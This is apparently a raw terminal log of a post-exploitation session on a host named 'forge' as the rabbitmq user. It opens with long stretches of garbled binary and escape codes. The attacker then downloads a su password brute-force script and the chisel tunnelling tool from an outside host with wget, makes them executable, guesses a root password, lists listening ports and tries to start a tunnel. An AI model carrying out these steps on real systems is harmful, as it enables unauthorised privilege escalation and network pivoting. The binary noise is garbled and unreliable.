¡¢£¤¥¦§¨©ª¶«¬­®¯°±²µµ·¸¹º»¼½¾¿ÀÁÂÃ¶ÄÄÅÅÆÇÈÉÊË·¸¹º»¼½¾¿ÀÁÂÃÌÍÎÏÏÆÇÈÉÊËĞÑÏÏÒÒÒÒÒÒÒÒÒÌÍÎÒÒÒÒÒÒÒÒĞÑÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒ61;6;7;22;23;24;28;32;42c[K[?2004l[K[A[K[A[K[A[K[A[K !"\%*#(+€ \&663)'!"$%*#(+,4/&-053)'771;<=$2>.8:99,4/?-05@ÒABÒ1;<=I2>.899GC?DEJ@ABHFKNOIPQLMRSVTGCWDEJZUÒHFKNOÒPQLMRSVTXYW[[aZbU\]]^^__``cdefghXYijkalbmnpqrstuvwcdefghoxijkylzmnpqrstuvw{|}~ox\ƒƒy€z8„‚‚…†‡ˆ{|}~‰Š‹Œ‘’“”•„–—…†‡ˆ˜™š›‰Š‹Œ‘’“”•œ–—˜™š›ŸŸ ¡¢£¤¥¦§¨©ªœ«¬­®¯°±²³³´´ ¡¢£¤¥¦§¨©ª¶«¬­®¯°±²µµ·¸¹º»¼½¾¿ÀÁÂÃ¶ÄÄÅÅÆÇÈÉÊË·¸¹º»¼½¾¿ÀÁÂÃÌÍÎÏÏÆÇÈÉÊËĞÑÏÏÒÒÒÒÒÒÒÒÒÌÍÎÒÒÒÒÒÒÒÒĞÑÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒ
+
+		ƒ	]
+
+			 !"#'&$ $%(!"#&%)*,'-.))/021&$3$%(51&%)*,-.))/02144366;5<17778899::=>?@AB44CDE;G<HIJKLNOPQR=>?@ABISCDETGUHIJKLNOPQRVXYZ\\IS```T^U^^_a__bdefVXYZghklmnorstuvwaxybdefz{|}ghklmnorstuvw~xy€€z{|}‚‚…†‡ˆŠŒ‘~’“”•–˜™š…†‡ˆŠŒ‘¡’“”•–˜™šŸŸ¢¤¥¦©ª«¬®¯°±²¡³³µµ¶·¹»½¾¢¤¥¦©ª«¬®¯°±²ÀÁÃÅÅ¶·¹»½¾ËÎÏÏÀÁÃËÎÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒ‰ÒÒÒ5:/6-1ECBB;`^=]bNl‘xÒ]hXpzwnu‡…{€ŒÒ’•¥“¥£©¾¯ÆÍÏÑÓ¾µÂĞÅÓÇÅÄØÛÒÒÎßÑ×áÒØÔÖæØâöêòÒ÷ûöÒ	M	Ò ÒÒ$ÒÒ&%*##11%3IKLQCÒ?QS=ÒEÒPSAHYWZRHT^ÒRcSÒÒgiÒpoÒizqÒÒt……Òƒˆ{sˆÒ‘{ÒÒ„Ò~’ÒÒ¦Ò©ÒÒÒÒÒŸÒÒ™³ÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒ[K[A[K[A[K[A[K[?2004h !"#'&$ $%(!"#&%)*,'-.))/021&$3$%(51&%)*,-.))/02144366;5<17778899::=>?@AB44CDE;G<HIJKLNOPQR=>?@ABISCDETGUHIJKLNOPQRVXYZ\\IS```T^U^^_a__bdefVXYZghklmnorstuvwaxybdefz{|}ghklmnorstuvw~xy€€z{|}‚‚…†‡ˆŠŒ‘~’“”•–˜™š…†‡ˆŠŒ‘¡’“”•–˜™šŸŸ¢¤¥¦©ª«¬®¯°±²¡³³µµ¶·¹»½¾¢¤¥¦©ª«¬®¯°±²ÀÁÃÅÅ¶·¹»½¾ËÎÏÏÀÁÃËÎÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒ‰ÒÒÒ5:/6-1ECBB;`^=]bNl‘xÒ]hXpzwnu‡…{€ŒÒ’•¥“¥£©¾¯ÆÍÏÑÓ¾µÂĞÅÓÇÅÄØÛÒÒÎßÑ×áÒØÔÖæØâöêòÒ÷ûöÒ	M	Ò ÒÒ$ÒÒ&%*##11%3IKLQCÒ?QS=ÒEÒPSAHYWZRHT^ÒRcSÒÒgiÒpoÒizqÒÒt……Òƒˆ{sˆÒ‘{ÒÒ„Ò~’ÒÒ¦Ò©ÒÒÒÒÒŸÒÒ™³ÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒ61;6;7;22;23;24;28;32;42c[K[?2004l[K[A[K[A[K[A[K			 !"#'&$ $%(!"#&%)*,'-.))/021&$3$%(51&%)*,-.))/02144366;5<17778899::=>?@AB44CDE;G<HIJKLNOPQR=>?@ABISCDETGUHIJKLNOPQRVXYZ\\IS```T^U^^_a__bdefVXYZghklmnorstuvwaxybdefz{|}ghklmnorstuvw~xy€€z{|}‚‚…†‡ˆŠŒ‘~’“”•–˜™š…†‡ˆŠŒ‘¡’“”•–˜™šŸŸ¢¤¥¦©ª«¬®¯°±²¡³³µµ¶·¹»½¾¢¤¥¦©ª«¬®¯°±²ÀÁÃÅÅ¶·¹»½¾ËÎÏÏÀÁÃËÎÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒ‰ÒÒÒ5:/6-1ECBB;`^=]bNl‘xÒ]hXpzwnu‡…{€ŒÒ’•¥“¥£©¾¯ÆÍÏÑÓ¾µÂĞÅÓÇÅÄØÛÒÒÎßÑ×áÒØÔÖæØâöêòÒ÷ûöÒ	M	Ò ÒÒ$ÒÒ&%*##11%3IKLQCÒ?QS=ÒEÒPSAHYWZRHT^ÒRcSÒÒgiÒpoÒizqÒÒt……Òƒˆ{sˆÒ‘{ÒÒ„Ò~’ÒÒ¦Ò©ÒÒÒÒÒŸÒÒ™³ÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒÒ0.--%%..............&&)#"! 	$
+,,'(*+(+(!	*(#") 
+	
+ !"#$%&'()*+,-./012345678"#$%&'(DA)*+,-U.;<=O7GVP········ò·ù·ÿ·îA···$¸1··2334444556666666789::;<<<<<<<<<<<<<<=>>>>>>>>>>>>?@ABBBBBBBCCDEFGGGGGGHHIIJJJJJGH%56789:;&'()*+,-./01
+"3ABCDEF$#<=3	3LMNOK@IJ4 >?!YZ8	
+@FERS> !IH/9:îîWÎTBC\ !X?6Î012345Q[]RS012345 !JKLMN	OQ-+($!"#$%&'()*+,-/	01H/./!"#$%&'()*+,I$/ :T\ ÿ!"#$%&'()*+,	
+0.1/	
+ !"#$%&'()*+,-ı····················O············
+'ë·77··?P·(·········ww···········?a·····=·=··a······a·;ôà|ÿÿ( ‚ÿÿP0‚ÿÿh`‡ÿÿL•ÿÿğ•ÿÿ€—ÿÿÈ`—ÿÿèà—ÿÿ˜ÿÿ$0˜ÿÿ@°˜ÿÿx™ÿÿ”0™ÿÿ°p™ÿÿÄ€™ÿÿØ°šÿÿğšÿÿ0`›ÿÿ\àœÿÿ`ÿÿø€Ÿÿÿ­ÿÿŒğ°ÿ[K[A[K[?2004h'ë·77··?P·(·········ww··········?a·····=·=··a······a·;ôà|ÿÿ( ‚ÿÿP0‚ÿÿh`‡ÿÿL•ÿÿğ•ÿÿ€—ÿÿÈ`—ÿÿèà—ÿ˜ÿÿ$0˜ÿÿ@°˜ÿÿx™ÿÿ”0™ÿÿ°p™ÿÿÄ€™ÿÿØ°šÿÿğšÿÿ0`›ÿÿ\àœÿÿ`ÿÿø€Ÿÿÿ­ÿÿŒğ°ÿ61;6;7;22;23;24;28;32;42c[K[?2004l[K[A[K'ë·77··?P·(·········ww···········?a·····=·=··a······a·;ôà|ÿÿ( ‚ÿÿP0‚ÿÿh`‡ÿÿL•ÿÿğ•ÿÿ€—ÿÿÈ`—ÿÿèà—ÿÿ˜ÿÿ$0˜ÿÿ@°˜ÿÿx™ÿÿ”0™ÿÿ°p™ÿÿÄ€™ÿÿØ°šÿÿğšÿÿ0`›ÿÿ\àœÿÿ`ÿÿø€Ÿÿÿ­ÿÿŒğ°ÿÿÜp²ÿÿ$@³ÿÿh Áÿÿ¸@Ñÿÿ ÓÿÿœzRxè“ÿÿ&D$4°{ÿÿ@FJw€?:*3$"\È€ÿÿtÀ€ÿÿ0DŒh”ÿÿPBI B(ŒA0†A8ƒá
+0D(B BBBDÔ@•ÿÿNFŒA†D ôp•ÿÿqBŒP†D Ğ•ÿÿEAK0Ô•ÿÿ0AAU4Lè•ÿÿwBGŒA †I(ƒN0F(F ABB„0–ÿÿHK†x d–ÿÿ0AAP¼x–ÿÿ@Ğ¤–ÿÿ8ä –ÿÿ(BBŒA †D(ƒG0š
+(A ABBH ”—ÿÿ=DN
+A(<¸—ÿÿbBŒA†L @
+DBA0hü—ÿÿqBŒA†H ƒJp¹
+ AABFdœH™ÿÿvA†GƒD0B
+AAHG
+HAPG
+HAHG
+HAHG
+HAH}
+AAA`šÿÿBŒA†G€
+p$`›ÿÿ‚BGB I(ŒD0†A8ƒG°-¸IÀM¸D°õ¸`Àl¸A°R
+8A0A(B BBBKL˜|¨ÿÿŞBBB B(ŒA0†A8ƒG°ƒ
+8A0A(B BBBBDè¬ÿÿsBEE ŒA(†A0ƒGÀ
+0D(A BBBE@0D­ÿÿÄA†AƒD d
+AADC
+AAKu
+AAALtĞ­ÿÿWFBB B(ŒA0†A8ƒD™
+8A0A(B BBBALÄà»ÿÿ˜BOB E(ŒD0†A8ƒG 
+8D0A(B BBBA@0ËÿÿÖBBB ŒA(†A0ƒD@1
+0D(A BBBALXÿÿ•FEB E(ŒA0†A8ƒG°*
+8A0A(B BBBA¨|Ìÿÿ
+[K[?2004h61;6;7;22;23;24;28;32;42c[K[?2004l[K[?2004h61;6;7;22;23;24;28;32;42c[K[?2004l IàH»”ŒÉ”Ù”ä”ï”÷”•••!•%•°’Æ’)•.•7•?•C•G•K•O•S•W•[•a•j•o•v•]•{•€•†•‹••“•—•›•Ÿ•£•§•«•¯•³•·•»•¿•Ã•Ç•Ë•Ï•×•à•[K[?2004h IàH»”ŒÉ”Ù”ä”ï”÷”•••!•%•°’Æ’)•.•7•?•C•G•K•O•S•W•[•a•j•o•v•]•{•€•†•‹••“•—•›•Ÿ•£•§•«•¯•³•·•»•¿•Ã•Ç•Ë•Ï•×•à•61;6;7;22;23;24;28;32;42c[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004l[K IàH»”ŒÉ”Ù”ä”ï”÷”•••!•%•°’Æ’)•.•7•?•C•G•K•O•S•W•[•a•j•o•v•]•{•€•†•‹••“•—•›•Ÿ•£•§•«•¯•³•·•»•¿•Ã•Ç•Ë•Ï•×•à•ê•ï•ù•
+––"–(–“6–H–S–`–k–w–ƒ–k“–˜–§–¶–Â–Ñ–¦Ù–á–ã–í–û–——ü–Ş0l†0Ø8Øõşÿo° Ø
+ØÜÈ[K[?2004hØÜÈ61;6;7;22;23;24;28;32;42c[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004l[KØÜÈx		ûÿÿoşÿÿoxÿÿÿoğÿÿo°ùÿÿoXèÚ00@0P0`0p0€00 0°0À0Ğ0à0ğ011 101@1P1`1p1€11 1°1À1Ğ1à1ğ122 202@2P2`2p2€22 2°2À2Ğ2à2ğ233 303@3P3`3p3€33 3°3À3Ğ3à3ğ344 404@4P4`4p4€44 4°4À4Ğ4à4ğ455 505@5P5àÿıÿÿÿıÿÿÿ/var/spool/cron/atjobs/12345678901234™‘075780f88f499a6b558c76495f38be6cee12d2.debugv“™.shstrtab.interp.note.gnu.property.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.plt.sec.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.data.rel.ro.dynamic.data.bss.gnu_debuglink880&hh$9ŒŒ Göÿÿo°°$QØØH	Y  aÿÿÿo°[K[?2004haÿÿÿo°61;6;7;22;23;24;28;32;42c[C[C[C[C[K[?2004l[KØÜÈx		ûÿÿoşÿÿoxÿÿÿoğÿÿo°ùÿÿoXèÚ00@0P0`0p0€00 0°0À0Ğ0à0ğ011 101@1P1`1p1€11 1°1À1Ğ1à1ğ122 202@2P2`2p2€22 2°2À2Ğ2à2ğ233 303@3P3`3p3€33 3°3À3Ğ3à3ğ344 404@4P4`4p4€44 4°4À4Ğ4à4ğ455 505@5P5àÿıÿÿÿıÿÿÿ/var/spool/cron/atjobs/12345678901234™‘075780f88f499a6b558c76495f38be6cee12d2.debugv“™.shstrtab.interp.note.gnu.property.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.plt.sec.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.data.rel.ro.dynamic.data.bss.gnu_debuglink880&hh$9ŒŒ Göÿÿo°°$QØØH	Y  aÿÿÿo°°Ænşÿÿoxx }x	‡BÈ‘00Œ 0 0@—`5`5 p5p50© : :ÊK¯l†l†µ># ½@³@³ôË8´8´¼Õ0Ø0Èá8Ø8Èí@Ø@È¨ úèÚèÊğ›ØÜØÌàĞp 	€àpĞP pĞ4¤Ğrabbitmq@forge:/home$ [K[?2004hµ># ½@³@³ôË8´8´¼Õ0á8í@Ø@È¨ úèÚèÊğ›ØÜØÌàĞp 	€àpĞP pĞ4¤Ğrabbitmq@forge:/home$ 61;6;7;22;23;24;28;32;42cstrings [7m/usr/bin/at[27mµ># ½@³@³ôË8´8´¼Õ0á8í@Ø@È¨ úèÚèÊğ›ØÜØÌàĞp 	€àpĞP pĞ4¤Ğrabbitmq@forge:/home$ [7m61;6;7;22;23;24;28;32;42cstrings [27m/usr/bin/at[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h61;6;7;22;23;24;28;32;42cstrings /usr/bin/at
+[K61;6;7;22;23;24;28;32;42cstrings /usr/bin/at
+[K61: command not found
+[K6: command not found
+7: command not found
+[K22: command not found
+23: command not found
+24: command not found
+[K28: command not found
+32: command not found
+[K42cstrings: command not found
+rabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ type [7m/usr/bin/at[27m[7mtype [27m/usr/bin/at[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004htype /usr/bin/at
+[Ktype /usr/bin/at
+[K/usr/bin/at is /usr/bin/at
+rabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ file [7m/usr/bin/at[27m[7mfile [27m/usr/bin/at[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hfile /usr/bin/at
+[Kfile /usr/bin/at
+[K/usr/bin/at: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ac075780f88f499a6b558c76495f38be6cee12d2, for GNU/Linux 3.2.0, stripped
+rabbitmq@forge:/home$ [Krabbitmq@forge:/home$ [K[?2004hrabbitmq@forge:/home$ wget -q http://10.8.61.245/[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kcd t[K/tmp[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /tmp
+[Kcd /tmp
+[Krabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ wget -q http://10.8.61.245?suBF.sh [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwget -q http://10.8.61.245?suBF.sh 
+[Kwget -q http://10.8.61.245?suBF.sh 
+[Krabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[K'index.html?suBF.sh'
+ snap-private-tmp
+ systemd-private-7665f10b6cb74cb9bd2cebacdf9ac9e7-apache2.service-W2aRmb
+ systemd-private-7665f10b6cb74cb9bd2cebacdf9ac9e7-ModemManager.service-BOJg3w
+ systemd-private-7665f10b6cb74cb9bd2cebacdf9ac9e7-systemd-logind.service-OuMB3M
+ systemd-private-7665f10b6cb74cb9bd2cebacdf9ac9e7-systemd-resolved.service-mh0DHI
+ systemd-private-7665f10b6cb74cb9bd2cebacdf9ac9e7-systemd-timesyncd.service-eIYtEX
+rabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ mv i       [K[K[7m'index.html?suBF.sh'[27m'index.html?suBF.sh' suBF.sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hmv 'index.html?suBF.sh' suBF.sh
+[Kmv 'index.html?suBF.sh' suBF.sh
+[Krabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Ksnap-private-tmp
+suBF.sh
+systemd-private-7665f10b6cb74cb9bd2cebacdf9ac9e7-apache2.service-W2aRmb
+systemd-private-7665f10b6cb74cb9bd2cebacdf9ac9e7-ModemManager.service-BOJg3w
+systemd-private-7665f10b6cb74cb9bd2cebacdf9ac9e7-systemd-logind.service-OuMB3M
+systemd-private-7665f10b6cb74cb9bd2cebacdf9ac9e7-systemd-resolved.service-mh0DHI
+systemd-private-7665f10b6cb74cb9bd2cebacdf9ac9e7-systemd-timesyncd.service-eIYtEX
+rabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ cat suBF.sh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat suBF.sh
+[Kcat suBF.sh
+[K<!DOCTYPE HTML>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Directory listing for /?suBF.sh</title>
+</head>
+<body>
+<h1>Directory listing for /?suBF.sh</h1>
+<hr>
+<ul>
+<li><a href=".git/">.git/</a></li>
+<li><a href="README.md">README.md</a></li>
+<li><a href="suBF.sh">suBF.sh</a></li>
+<li><a href="top12000.txt">top12000.txt</a></li>
+</ul>
+<hr>
+</body>
+</html>
+rabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ rm suBF.sh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hrm suBF.sh
+[Krm suBF.sh[Krm suBF.sh[Krm suBF.sh
+rabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K-q http:[?2004hrabbitmq@forge:/tmp$ [7mwget -q http://10.8.61.245?suBF.sh[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cwget -q http://10.8.61.245?suBF.sh[K[K[K[K[K[K[K[K/suBF.sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwget -q http://10.8.61.245/suBF.sh
+[Kwget -q http://10.8.61.245/suBF.sh
+[Krabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Ksnap-private-tmp
+suBF.sh
+systemd-private-7665f10b6cb74cb9bd2cebacdf9ac9e7-apache2.service-W2aRmb
+systemd-private-7665f10b6cb74cb9bd2cebacdf9ac9e7-ModemManager.service-BOJg3w
+systemd-private-7665f10b6cb74cb9bd2cebacdf9ac9e7-systemd-logind.service-OuMB3M
+systemd-private-7665f10b6cb74cb9bd2cebacdf9ac9e7-systemd-resolved.service-mh0DHI
+systemd-private-7665f10b6cb74cb9bd2cebacdf9ac9e7-systemd-timesyncd.service-eIYtEX
+rabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ cho[Kmod +x suBF      [K.sh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hchmod +x suBF.sh
+[Kchmod +x suBF.sh
+[Krabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ ./suBF.sh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./suBF.sh
+[K./suBF.sh
+[KThis tool bruteforces a selected user using binary su and as passwords: null password, username, reverse username and a wordlist (top12000.txt).
+You can specify a username using -u <username> and a wordlist via -w <wordlist>.
+By default the BF default speed is using 100 su processes at the same time (each su try last 0.7s and a new su try in 0.007s) ~ 143s to complete
+You can configure this times using -t (timeout su process) ans -s (sleep between 2 su processes).
+Fastest recommendation: -t 0.5 (minimun acceptable) and -s 0.003 ~ 108s to complete
+
+Example:    ./suBF.sh -u <USERNAME> [-w top12000.txt] [-t 0.7] [-s 0.007]
+
+THE USERNAME IS CASE SENSITIVE AND THIS SCRIPT DOES NOT CHECK IF THE PROVIDED USERNAME EXIST, BE CAREFUL
+
+rabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ su root[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsu root
+[Ksu root
+[KPassword: [KPassword: [K[?2004hPassword: password[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hpassword
+[K
+[Ksu: Authentication failure
+[Krabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ wget -q http://10.8.61.245/chisel[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwget -q http://10.8.61.245/chisel
+[Kwget -q http://10.8.61.245/chisel
+[Krabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kchisel
+snap-private-tmp
+suBF.sh
+systemd-private-7665f10b6cb74cb9bd2cebacdf9ac9e7-apache2.service-W2aRmb
+systemd-private-7665f10b6cb74cb9bd2cebacdf9ac9e7-ModemManager.service-BOJg3w
+systemd-private-7665f10b6cb74cb9bd2cebacdf9ac9e7-systemd-logind.service-OuMB3M
+systemd-private-7665f10b6cb74cb9bd2cebacdf9ac9e7-systemd-resolved.service-mh0DHI
+systemd-private-7665f10b6cb74cb9bd2cebacdf9ac9e7-systemd-timesyncd.service-eIYtEX
+rabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ chmod +x chisel[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hchmod +x chisel
+[Kchmod +x chisel
+[Krabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ [7mnetstat -tuln[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hnetstat -tuln
+[Knetstat -tuln
+[KActive Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:5672          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:15672         0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:25672           0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp6       0      0 :::80                   :::*                    LISTEN     
+tcp6       0      0 :::22                   :::*                    LISTEN     
+tcp6       0      0 :::4369                 :::*                    LISTEN     
+udp        0      0 0.0.0.0:48575           0.0.0.0:*                          
+udp        0      0 127.0.0.53:53           0.0.0.0:*                          
+udp        0      0 10.10.187.101:68        0.0.0.0:*                          
+rabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [Kl server[?2004hrabbitmq@forge:/tmp$ [7mchisel server --port 8000[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cchisel server --port 8000[C[K[K[K[K15672[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hchisel server --port 15672
+[Kchisel server --port 15672
+[Kchisel: command not found
+rabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ chisel server --port 15672[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1@.[1@/[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./chisel server --port 15672
+[K./chisel server --port 15672
+[K2025/02/23 16:47:21 server: Fingerprint zW9cHumz+qNU3lBjo1mTAY2og22tvdY0apZSjgEUdKg=
+2025/02/23 16:47:21 listen tcp 0.0.0.0:15672: bind: address already in use
+rabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ [7msudo lsof -i :15672[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo lsof -i :15672
+[Ksudo lsof -i :15672
+[K[sudo] password for rabbitmq: [K[sudo] password for rabbitmq: [K[?2004h[sudo] password for rabbitmq: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[KSorry, try again.
+[K[sudo] password for rabbitmq: [K[sudo] password for rabbitmq: [K[?2004h[sudo] password for rabbitmq: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[KSorry, try again.
